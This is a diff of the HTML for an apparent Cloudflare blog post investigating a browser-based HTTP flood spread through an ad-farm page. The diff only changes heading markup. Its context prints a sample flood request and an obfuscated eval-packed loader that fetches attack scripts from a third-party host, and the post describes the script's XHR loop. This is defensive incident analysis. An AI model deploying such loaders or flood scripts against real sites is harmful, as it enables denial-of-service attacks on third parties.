@@ -7,7 +7,14 @@
 		<img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/5bN1tR7glZEty20EnbJlgX/16940bdee92ac0c6080398714bb2a0e3/js-attack.png" alt="" class="kg-image" width="900" height="300" loading="lazy">
 
 	</figure>
-	<h3>The request</h3>
+	<div class="flex anchor relative">
+		<h3 id="the-request">The request</h3>
+		<a href="https://blog.cloudflare.com/#the-request" aria-hidden="true" class="relative sm:absolute sm:-left-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
 	<p>Here is one of the requests:</p>
 	<pre class="language-.txt"><code class="language-.txt">POST /js/404.js HTTP/1.1
 Host: www.victim.com
@@ -26,7 +33,15 @@ id=datadatadasssssssssssssssssssssssssssssssssssssssssssasssssssssssssssssssssss
 	<p>First, let's note that the headers look legitimate. We often see floods issued by Python or Ruby scripts, with weird <code>Accept-Language</code> or <code>User-Agent</code> headers. But this one doesn't look like it. This request is a proper request issued by a real browser.</p>
 	<p>Next, notice the request is a <code>POST</code> and contains an <code>Origin</code> header — it was issued by an Ajax (XHR) cross origin call.</p>
 	<p>Finally, the <code>Referer</code> points to the website which was issuing these queries against our servers. We checked: the URL was correct and the site was reachable.</p>
-	<h3>Browser-based floods</h3>
+	<div class="flex anchor relative">
+		<h3 id="browser-based-floods">Browser-based floods</h3>
+		<a href="https://blog.cloudflare.com/#browser-based-floods" aria-hidden="true" class="relative sm:absolute sm:-left-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
+
 	<figure class="kg-card kg-image-card ">
 
 		<img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/2AqpgYnoRyV0TFH7B5ktuG/21e3c359b38285b3a960d4ac1c1ed8d5/attack.jpg" alt="" class="kg-image" width="669" height="342" loading="lazy">
@@ -37,7 +52,14 @@ id=datadatadasssssssssssssssssssssssssssssssssssssssssssasssssssssssssssssssssss
 	<p>Finally, in April it was reported that the <a href="https://citizenlab.org/wp-content/uploads/2009/10/ChinasGreatCannon.pdf">Great Cannon</a> distributing JavaScript with a novel method - by injecting raw TCP segments into passing by connections. And just this week a <a href="https://imgur.com/blog/2015/09/22/imgur-vulnerability-patched">flaw</a> popular image hosting site was used to attack another site.</p>
 	<p>It seems the biggest difficulty is not in creating the JavaScript — it is in effectively distributing it. Since an efficient distribution vector is crucial in issuing large floods, up until now I haven't seen many sizable browser-based floods.</p>
 	<p>This is what made the flood described above interesting — it was pretty large, peaking at over 275,000 HTTP requests per second.</p>
-	<h3>The attack page</h3>
+	<div class="flex anchor relative">
+		<h3 id="the-attack-page">The attack page</h3>
+		<a href="https://blog.cloudflare.com/#the-attack-page" aria-hidden="true" class="relative sm:absolute sm:-left-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
 	<p>To investigate the source of the flood we followed the <code>Referer</code> header. It was an exciting journey.</p>
 	<p>The web page from the <code>Referer</code> looked like a link farm or an ad aggregator — imagine a couple of dozen blinking and shouting banners centrally on a page, nothing more. For this discussion, let's call this page "the attack site". The page was written in basic HTML and used a couple of simple JavaScript routines. It loaded three small JavaScript files, one of them was called <code>count.js</code>. It contained some not notable <code>document.write</code> statements, followed by 50 new lines and this obfuscated code:</p>
 	<pre class="language-.txt"><code class="language-.txt">eval(function(p,a,c,k,e,r){e=String;if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[0-8]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('2.3("&lt;0 4=\\"5://6.anotherattacksite.7/8/1/jquery2.1\\"&gt;&lt;/0&gt;");2.3("&lt;0 4=\\"5://6.anotherattacksite.7/8/1/jquery1.1\\"&gt;&lt;/0&gt;");',[],9,'script|js|document|writeln|src|http|www|com|css'.split('|'),0,{}))</code></pre>
@@ -68,7 +90,15 @@ if(!+[1,]) { //IE下不执行。
 }</code></pre>
 	<p>The malicious script above just launches an XHR in a loop.</p>
 	<p>On a side note it uses a pretty smart method of detecting IE. We were not aware <code>if(!+[1,])</code> can be used to detect Internet Explorer 9 and older.</p>
-	<h3>Analyzing the logs</h3>
+	<div class="flex anchor relative">
+		<h3 id="analyzing-the-logs">Analyzing the logs</h3>
+		<a href="https://blog.cloudflare.com/#analyzing-the-logs" aria-hidden="true" class="relative sm:absolute sm:-left-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
+
 	<figure class="kg-card kg-image-card ">
 
 		<img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/17OcsBzBqKGNH22bIAimLB/91ef5eeafdd740112a771b372940ddc6/requests-2.png" alt="" class="kg-image" width="1120" height="790" loading="lazy">
@@ -100,7 +130,14 @@ Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrom
 Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36 2345Explorer/6.1.0.8631
 Mozilla/5.0 (Linux; U; Android 4.4.4; zh-CN; MI 3 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.2.626 U3/0.8.0 Mobile Safari/534.3</code></pre>
 	<p>Strings like "iThunder" might indicate the request came from a mobile app. Others like "MetaSr", "F1Browser", "QQBrowser", "2345Explorer" and "UCBrowser" point towards browsers or browser apps popular in China.</p>
-	<h3>The distribution vector</h3>
+	<div class="flex anchor relative">
+		<h3 id="the-distribution-vector">The distribution vector</h3>
+		<a href="https://blog.cloudflare.com/#the-distribution-vector" aria-hidden="true" class="relative sm:absolute sm:-left-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
 	<p>This is the part where the hard evidence ends and a speculation begins. There is no way to know for sure why so many mobile devices visited the attack page, but the most plausible distribution vector seems to be an ad network. It seems probable that users were served advertisements containing the malicious JavaScript. This ads were likely showed in iframes in mobile apps, or mobile browsers to people casually browsing the internet.</p>
 	<p>During the flood we were able to look at the packet traces and we are confident the attack didn't involve a TCP packet injection.</p>
 	<p>To recap, we think this had happened:</p>
